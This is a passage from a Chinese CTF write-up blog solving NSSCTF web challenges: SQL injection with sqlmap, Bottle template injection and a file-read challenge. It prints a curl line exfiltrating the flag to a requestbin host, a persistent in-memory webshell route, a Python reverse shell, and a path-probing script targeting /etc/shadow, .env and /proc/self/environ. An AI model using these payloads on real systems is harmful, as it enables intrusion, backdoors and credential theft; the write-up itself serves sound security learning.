constant">N</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>得出。</p>
<hr>
<h3 id="SQL-（2）"><a href="#SQL-（2）" class="headerlink" title="SQL???（2）"></a>SQL???（2）</h3><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/719df3bea63b944bbb385a9d73944f51.png"></p>
<p>这个故事告诉我们要看一下错误后的内容，<del>还有要掌握一门外语（</del></p>
<blockquote>
<p><code>--random-agent</code> 它的作用是让 SQLMap 在每次向目标网站发送请求时，随机选择一个不同的用户代理（User-Agent）字符串。</p>
<p>许多 Web 应用防火墙（WAF）会根据用户代理字符串来判断请求是否合法。如果一个来源的请求始终使用相同的用户代理字符串，WAF 可能会将其识别为自动化工具（如 SQLMap）的请求，并进行拦截。而使用 <code>--random-agent</code> 选项后，每次请求的用户代理字符串都不同，模拟了不同用户使用不同浏览器和设备访问网站的情况，从而增加了绕过 WAF 检测的可能性。</p>
</blockquote>
<p><code>sqlmap -u "http://node1.anna.nssctf.cn:28030/?id=1" --random-agent </code></p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/8fe07bf64acf321407966ca85d453b0f.png"></p>
<p><del>但其实能让它扫16分钟的也是神人了</del></p>
<hr>
<h3 id="Message-in-a-Bottle"><a href="#Message-in-a-Bottle" class="headerlink" title="Message in a Bottle"></a>Message in a Bottle</h3><p>源代码如下</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> bottle <span class="token keyword">import</span> Bottle<span class="token punctuation">,</span> request<span class="token punctuation">,</span> template<span class="token punctuation">,</span> run


app <span class="token operator">=</span> Bottle<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment"># 存储留言的列表</span>
messages <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token keyword">def</span> <span class="token function">handle_message</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">:</span>
    message_items <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string-interpolation"><span class="token string">f"""
        
            </span><span class="token interpolation"><span class="token punctuation">{</span>msg<span class="token punctuation">}</span></span><span class="token string">
            #</span><span class="token interpolation"><span class="token punctuation">{</span>idx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">}</span></span><span class="token string"> - 刚刚
        
    """</span></span> <span class="token keyword">for</span> idx<span class="token punctuation">,</span> msg <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

    board <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"""
    
    
        
        
        简约留言板
        
         
            :root {{
                --primary-color: #4a90e2;
                --hover-color: #357abd;
                --background-color: #f8f9fa;
                --card-background: #ffffff;
                --shadow-color: rgba(0, 0, 0, 0.1);
            }}

            body {{
                background: var(--background-color);
                min-height: 100vh;
                padding: 2rem 0;
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            }}

            .container {{
                max-width: 800px;
                background: var(--card-background);
                border-radius: 15px;
                box-shadow: 0 4px 6px var(--shadow-color);
                padding: 2rem;
                margin-top: 2rem;
                animation: fadeIn 0.5s ease-in-out;
            }}

            @keyframes fadeIn {{
                from {{ opacity: 0; transform: translateY(20px); }}
                to {{ opacity: 1; transform: translateY(0); }}
            }}

            .message-card {{
                background: var(--card-background);
                border-radius: 10px;
                padding: 1.5rem;
                margin: 1rem 0;
                transition: all 0.3s ease;
                border-left: 4px solid var(--primary-color);
                box-shadow: 0 2px 4px var(--shadow-color);
            }}

            .message-card:hover {{
                transform: translateX(10px);
                box-shadow: 0 4px 8px var(--shadow-color);
            }}

            .message-content {{
                font-size: 1.1rem;
                color: #333;
                line-height: 1.6;
                margin-bottom: 0.5rem;
            }}

            .message-time {{
                color: #6c757d;
                font-size: 0.9rem;
                display: block;
                margin-top: 0.5rem;
            }}

            textarea {{
                width: 100%;
                height: 120px;
                padding: 1rem;
                border: 2px solid #e9ecef;
                border-radius: 10px;
                resize: vertical;
                font-size: 1rem;
                transition: border-color 0.3s ease;
            }}

            textarea:focus {{
                border-color: var(--primary-color);
                outline: none;
                box-shadow: 0 0 0 3px rgba(74, 144, 226, 0.1);
            }}

            .btn-custom {{
                background: var(--primary-color);
                color: white;
                padding: 0.8rem 2rem;
                border-radius: 10px;
                border: none;
                transition: all 0.3s ease;
                font-weight: 500;
                text-transform: uppercase;
                letter-spacing: 0.05rem;
            }}

            .btn-custom:hover {{
                background: var(--hover-color);
                transform: translateY(-2px);
                box-shadow: 0 4px 8px var(--shadow-color);
            }}

            h1 {{
                color: var(--primary-color);
                text-align: center;
                margin-bottom: 2rem;
                font-weight: 600;
                font-size: 2.5rem;
                text-shadow: 2px 2px 4px var(--shadow-color);
            }}

            .btn-danger {{
                transition: all 0.3s ease;
                padding: 0.6rem 1.5rem;
                border-radius: 10px;
                text-transform: uppercase;
                letter-spacing: 0.05rem;
            }}

            .btn-danger:hover {{
                transform: translateY(-2px);
                box-shadow: 0 4px 8px var(--shadow-color);
            }}

            .text-muted {{
                font-style: italic;
                color: #6c757d !important;
            }}

            @media (max-width: 576px) {{
                h1 {{
                    font-size: 2rem;
                }}
                .container {{
                    padding: 1.5rem;
                }}
                .message-card {{
                    padding: 1rem;
                }}
            }}
        
    
    
        
            
                 简约留言板
                
                     一键清理
                
            

            
                
                
                    发布留言
                
            

            
                
                    最新留言（</span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">len</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">条）
                    </span><span class="token interpolation"><span class="token punctuation">{</span><span class="token string-interpolation"><span class="token string">f'点击右侧清理按钮可清空列表'</span></span> <span class="token keyword">if</span> message <span class="token keyword">else</span> <span class="token string">''</span><span class="token punctuation">}</span></span><span class="token string">
                
                </span><span class="token interpolation"><span class="token punctuation">{</span>message_items<span class="token punctuation">}</span></span><span class="token string">
            
        
    
    """</span></span>
    <span class="token keyword">return</span> board



<span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> message<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"{"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"}"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> template<span class="token punctuation">(</span>handle_message<span class="token punctuation">(</span>messages<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/Clean'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">Clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">global</span> messages
    messages <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">return</span> <span class="token string">'window.location.href="/"'</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/submit'</span><span class="token punctuation">,</span> method<span class="token operator">=</span><span class="token string">'POST'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    message <span class="token operator">=</span> waf<span class="token punctuation">(</span>request<span class="token punctuation">.</span>forms<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'message'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    messages<span class="token punctuation">.</span>append<span class="token punctuation">(</span>message<span class="token punctuation">)</span>
    <span class="token keyword">return</span> template<span class="token punctuation">(</span>handle_message<span class="token punctuation">(</span>messages<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    run<span class="token punctuation">(</span>app<span class="token punctuation">,</span> host<span class="token operator">=</span><span class="token string">'localhost'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">9000</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>很明显的Bottle模版注入，过滤了{和}，尝试闭合标签并写入python代码</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&lt;</span>/div<span class="token operator">&gt;</span>
% print<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
<span class="token operator">&lt;</span>div<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>没有回显，但是代码也消失了，判断应该是执行命令但是没有回显</p>
<p>尝试直接外带数据</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&lt;</span>/div<span class="token operator">&gt;</span>
% print<span class="token punctuation">(</span>__import__<span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span>.popen<span class="token punctuation">(</span><span class="token string">'curl http://requestbin.cn:80/1lt58m51?data=$(cat /flag | base64)'</span><span class="token punctuation">)</span>.read<span class="token punctuation">(</span><span class="token punctuation">))</span>`
<span class="token operator">&lt;</span>div<span class="token operator">&gt;</span>
<span class="token comment">#使用 __import__('os') 动态导入 os 模块，__import__ 是 Python 内置的用于动态导入模块的函数。</span>
<span class="token comment">#调用 os.popen 函数执行一个系统命令。</span>
<span class="token comment">#使用 read() 方法读取 os.popen 执行命令后的输出结果，并通过 print 函数打印出来</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>依然没有接收到，判断可能不出网，使用sleep进行盲注</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&lt;</span>/div<span class="token operator">&gt;</span>
% __import__<span class="token punctuation">(</span><span class="token string">"time"</span><span class="token punctuation">)</span>.sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token keyword">if</span> open<span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">)</span>.read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'N'</span> <span class="token keyword">else</span> <span class="token number">1</span>
<span class="token operator">&lt;</span>div<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>产生延时，的确可行，逐位爆破即可，先猜个前7位:<code>NSSCTF{</code></p>
<p>然后就是爆破了，使用BP进行逐位半自动爆破(逻辑有点复杂，不会写脚本)，注意BP默认多线程爆破，不容易判断在哪一次上传后产生延时，将线程改为1即可，字典使用<code>abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_!@#$%^&amp;*()-+</code>,然后将每一次上传时第一个产生延时的字符填入对应的flag位置即可(注意环境重启flag会切换，中间换环境了要重新开始，<del>我就中间换了环境导致flag不对卡半天</del>)，每判断一位清理一次留言板。</p>
<p>最终得到flag</p>
<blockquote>
<p>NSSCTF{6b3d59cb-29a4-451b-ac74-6abc607ea182}</p>
</blockquote>
<p>​                                                                                                                                                                                                        —-xianxin</p>
<p>内存马：</p>
<p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/4048">奇安信攻防社区-探寻Bottle框架内存马</a></p>
<p><a target="_blank" rel="noopener" href="https://research.qianxin.com/archives/2329">Python Web内存马多框架植入技术详解 – 奇安信技术研究院</a></p>
<p><a target="_blank" rel="noopener" href="https://www.osgeo.cn/bottle/stpl.html">SimpleTemplate 模板引擎 — Bottle 0.13-dev 文档</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/cc3cfb29ac910fa1b973256852a25e12.png"></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#内存马</span>
<span class="token operator">%</span> <span class="token keyword">from</span> bottle <span class="token keyword">import</span> Bottle<span class="token punctuation">,</span> request
<span class="token operator">%</span> app<span class="token operator">=</span><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'sys'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">'__main__'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span><span class="token string">'app'</span><span class="token punctuation">]</span>
<span class="token operator">%</span> app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">"/shell"</span><span class="token punctuation">,</span><span class="token string">"GET"</span><span class="token punctuation">,</span><span class="token keyword">lambda</span> <span class="token punctuation">:</span><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span>request<span class="token punctuation">.</span>params<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'lalala'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment">#从 bottle 框架中导入 Bottle 类和 request 对象。Bottle 类用于创建 Web 应用，request 对象用于获取客户端请求的相关信息。</span>
<span class="token comment">#使用 __import__('sys') 动态导入 sys 模块，通过 sys.modules['__main__'] 获取主模块，再从主模块的命名空间（__dict__）中获取名为 app 的 Bottle 应用实例。(通过 sys 模块获取主模块的命名空间，从中提取出已存在的 Bottle 应用实例 app。)</span>
<span class="token comment">#为 Bottle 应用添加一个新的路由 /shell，该路由处理 GET 请求。当客户端访问 /shell 时，会执行一个匿名函数。这个匿名函数的功能是：</span>
<span class="token comment">#使用 request.params.get('lalala') 从请求的查询参数中获取名为 lalala 的值。</span>
<span class="token comment">#使用 __import__('os') 动态导入 os 模块，然后调用 os.popen 函数执行从查询参数中获取的值作为系统命令。</span>
<span class="token comment">#最后读取命令执行的输出结果并返回给客户端。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#弹shell</span>
<span class="token operator">%</span><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span>"python3 <span class="token operator">-</span>c '<span class="token keyword">import</span> os<span class="token punctuation">,</span>pty<span class="token punctuation">,</span>socket<span class="token punctuation">;</span>s<span class="token operator">=</span>socket<span class="token punctuation">.</span>socket
<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>\"<span class="token number">111</span><span class="token punctuation">.</span>xxx<span class="token punctuation">.</span>xxx<span class="token punctuation">.</span>xxx\"<span class="token punctuation">,</span><span class="token number">7777</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">[</span>os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>f<span class="token punctuation">)</span><span class="token keyword">for</span> f <span class="token keyword">in</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>
<span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>pty<span class="token punctuation">.</span>spawn<span class="token punctuation">(</span>\<span class="token string">"sh\")'"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
             
<span class="token triple-quoted-string string">"""python3 -c：这是 Python 命令行选项，用于直接执行后面单引号内的 Python 代码。
import os,pty,socket：导入 os、pty 和 socket 模块。os 模块提供了与操作系统进行交互的功能；pty 模块用于创建伪终端；socket 模块用于网络通信。
s = socket.socket()：创建一个 TCP 套接字对象 s。
s.connect(("111.xxx.xxx.xxx", 7777))：尝试连接到指定 IP 地址（111.xxx.xxx.xxx）和端口（7777）的远程服务器。
[os.dup2(s.fileno(), f) for f in (0, 1, 2)]：
s.fileno() 返回套接字对象 s 的文件描述符。
os.dup2 函数用于复制文件描述符，这里将标准输入（文件描述符 0）、标准输出（文件描述符 1）和标准错误（文件描述符 2）都重定向到套接字 s。这样，后续的输入输出操作都会通过网络套接字进行。
pty.spawn("sh")：启动一个新的 shell 进程（这里是 sh），并将其与之前重定向的标准输入、输出和错误关联起来。这样，攻击者在远程服务器上就可以通过这个套接字控制目标系统的 shell，实现反弹 shell 的效果。"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h3 id="ez-readfile-2"><a href="#ez-readfile-2" class="headerlink" title="ez_readfile(2)"></a>ez_readfile(2)</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
TARGET_URL <span class="token operator">=</span> <span class="token string">"http://node1.anna.nssctf.cn:28067/"</span>
POST_DATA <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token comment">#POST 请求携带的数据。</span>
  <span class="token string">"a"</span><span class="token punctuation">:</span> <span class="token string">"TEXTCOLLBYfGiJUETHQ4hAcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak"</span><span class="token punctuation">,</span>
  <span class="token string">"b"</span><span class="token punctuation">:</span> <span class="token string">"TEXTCOLLBYfGiJUETHQ4hEcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak"</span>
<span class="token punctuation">}</span>
TEST_PATHS <span class="token operator">=</span> <span class="token punctuation">[</span>
  <span class="token string">"/flag"</span><span class="token punctuation">,</span>  <span class="token comment"># 绝对路径</span>
  <span class="token string">"../../../../flag"</span><span class="token punctuation">,</span>  <span class="token comment"># 路径遍历</span>
  <span class="token string">"/flag.txt"</span><span class="token punctuation">,</span> <span class="token comment"># 常见扩展名</span>
  <span class="token string">"/etc/passwd"</span><span class="token punctuation">,</span>
  <span class="token string">"/app/flag"</span><span class="token punctuation">,</span>
  <span class="token string">"/run/secrets/flag"</span><span class="token punctuation">,</span>
  <span class="token string">"/opt/flag"</span><span class="token punctuation">,</span>
  <span class="token string">"/usr/local/flag"</span><span class="token punctuation">,</span>
  <span class="token string">"/docker-entrypoint.sh"</span><span class="token punctuation">,</span>
  <span class="token string">"/tmp/flag"</span><span class="token punctuation">,</span>
  <span class="token string">"tmp/flag.tmp"</span><span class="token punctuation">,</span>
  <span class="token string">"/var/tmp/flag"</span><span class="token punctuation">,</span>
  <span class="token string">"/var/log/apache2/access.log"</span><span class="token punctuation">,</span>
  <span class="token string">"/var/log/nginx/access.log"</span><span class="token punctuation">,</span>
  <span class="token string">"/var/log/auth.log"</span><span class="token punctuation">,</span>
  <span class="token string">"/var/log/syslog"</span><span class="token punctuation">,</span>
  <span class="token string">"/var/www/html/index.php"</span><span class="token punctuation">,</span>
  <span class="token string">"/var/www/html/config.php"</span><span class="token punctuation">,</span>
  <span class="token string">"/var/www/html/.env"</span><span class="token punctuation">,</span>
  <span class="token string">"/var/www/html/admin/flag"</span><span class="token punctuation">,</span>
  <span class="token string">"/var/www/html/uploads/flag"</span><span class="token punctuation">,</span>
  <span class="token string">"/var/www/html/secret/flag"</span><span class="token punctuation">,</span>
  <span class="token string">"/var/www/html/robots.txt"</span><span class="token punctuation">,</span>
  <span class="token string">"/var/backups/flag"</span><span class="token punctuation">,</span>
  <span class="token string">"/var/backups/flag.bak"</span><span class="token punctuation">,</span>
  <span class="token string">"/var/backups/app.tar.gz"</span><span class="token punctuation">,</span>
  <span class="token string">"/var/lib/gnats/flag"</span><span class="token punctuation">,</span>
  <span class="token string">"/home/flag"</span><span class="token punctuation">,</span>
  <span class="token string">"/home/user/flag"</span><span class="token punctuation">,</span>
  <span class="token string">"/etc/shadow"</span><span class="token punctuation">,</span>
  <span class="token string">"/etc/flag"</span><span class="token punctuation">,</span>
  <span class="token string">"/etc/motd"</span><span class="token punctuation">,</span>
  <span class="token string">"/etc/hosts"</span><span class="token punctuation">,</span>
  <span class="token string">"/etc/environment"</span><span class="token punctuation">,</span>
  <span class="token string">"/proc/self/environ"</span><span class="token punctuation">,</span>
  <span class="token string">"/proc/version"</span><span class="token punctuation">,</span>
  <span class="token string">"/tmp/flag"</span><span class="token punctuation">,</span>
  <span class="token string">"/tmp/flag.tmp"</span><span class="token punctuation">,</span>
  <span class="token string">"/var/tmp/flag"</span><span class="token punctuation">,</span>
  <span class="token string">"/var/log/apache2/access.log"</span><span class="token punctuation">,</span>
  <span class="token string">"/var/log/nginx/access.log"</span><span class="token punctuation">,</span>
  <span class="token string">"/var/log/auth.log"</span><span class="token punctuation">,</span>
  <span class="token string">"/var/log/syslog"</span><span class="token punctuation">,</span>
  <span class="token string">"/flag.bak"</span><span class="token punctuation">,</span>
  <span class="token string">"/flag.old"</span><span class="token punctuation">,</span>
  <span class="token string">"/flag.swp"</span><span class="token punctuation">,</span>
  <span class="token string">"/flag.swo"</span><span class="token punctuation">,</span>
  <span class="token string">".flag"</span><span class="token punctuation">,</span>
  <span class="token string">".flag.txt"</span><span class="token punctuation">,</span>
  <span class="token string">".flag.php"</span><span class="token punctuation">,</span>
  <span class="token string">"._flag"</span><span class="token punctuation">,</span>
  <span class="token string">"/readme.md"</span><span class="token punctuation">,</span>
  <span class="token string">"/notice.txt"</span><span class="token punctuation">,</span>
  <span class="token string">"/hint.txt"</span><span class="token punctuation">,</span>
  <span class="token string">"/secret"</span><span class="token punctuation">,</span>
  <span class="token string">"/admin/flag"</span><span class="token punctuation">,</span>
  <span class="token string">"/api/flag"</span><span class="token punctuation">,</span>
  <span class="token string">"/v1/flag"</span>
<span class="token punctuation">]</span>
<span class="token keyword">def</span> <span class="token function">test_paths</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> path <span class="token keyword">in</span> TEST_PATHS<span class="token punctuation">:</span>
        params<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"file"</span><span class="token punctuation">:</span>path<span class="token punctuation">}</span><span class="token comment">#为每个路径创建一个包含 file 参数的字典 params。</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            response<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>
                TARGET_URL<span class="token punctuation">,</span>
                data<span class="token operator">=</span>POST_DATA<span class="token punctuation">,</span>
                params<span class="token operator">=</span>params<span class="token punctuation">,</span>
                timeout<span class="token operator">=</span><span class="token number">5</span>
            <span class="token punctuation">)</span>
            <span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code<span class="token operator">==</span><span class="token number">200</span><span class="token punctuation">:</span>
                <span class="token keyword">if</span> <span class="token string">"NSSCTF{"</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+]成功获取 Flag:</span><span class="token interpolation"><span class="token punctuation">{</span>response<span class="token punctuation">.</span>text<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
                    <span class="token keyword">return</span>
                <span class="token keyword">elif</span> <span class="token string">"Warning"</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Warning"</span><span class="token punctuation">)</span>
                <span class="token keyword">else</span><span class="token punctuation">:</span>
                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"No Warning:</span><span class="token interpolation"><span class="token punctuation">{</span>path<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[!]测试</span><span class="token interpolation"><span class="token punctuation">{</span>path<span class="token punctuation">}</span></span><span class="token string">时出错：</span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>
    <span class="token comment">#当脚本作为主程序运行时，调用 test_paths 函数开始测试。</span>
    test_paths<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/4sh3s/p/15551544.html">CTF中文件读取漏洞常见读取路径 - 4sh3s - 博客园</a></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">curl <span class="token operator">-</span>X POST http<span class="token punctuation">:</span><span class="token operator">//</span>node1<span class="token punctuation">.</span>anna<span class="token punctuation">.</span>nssctf<span class="token punctuation">.</span>cn<span class="token punctuation">:</span><span class="token number">28067</span><span class="token operator">/</span>?<span class="token builtin">file</span><span class="token operator">=</span><span class="token operator">/</span>docker<span class="token operator">-</span>entrypoint<span class="token punctuation">.</span>sh <span class="token operator">-</span>d <span class="token string">"a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/36143b34c3bd405a66e5f326ef1a7244.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/aa2e2d35157574b63788c25d2e1e6b25.png"></p>
<p>or CVE-2024-2961漏洞原：<a target="_blank" rel="noopener" href="https://github.com/ambionics/cnext-exploits/blob/main/cnext-exploit.py">cnext-exploits/cnext-exploit.py at main · ambionics/cnext-exploits</a></p>
<blockquote>
